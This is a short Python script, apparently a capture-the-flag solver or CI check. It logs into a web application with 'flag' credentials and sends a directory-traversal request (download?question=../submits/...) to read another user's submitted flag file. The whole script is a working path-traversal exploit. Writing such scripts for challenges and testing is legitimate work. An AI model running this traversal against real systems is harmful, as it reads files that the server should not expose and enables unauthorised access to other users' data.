import requests
import re
import os

#python example of gettting host host
host=os.environ['CI_REGISTRY_IMAGE'].replace('/','-')
url = "http://"+host
s=requests.Session()
s.post(url+"/login",data={"username":"flag","password":"flag"})
r=s.get(url+"/download?question=../submits/Cedric_Kelly_flag")
print(r.text)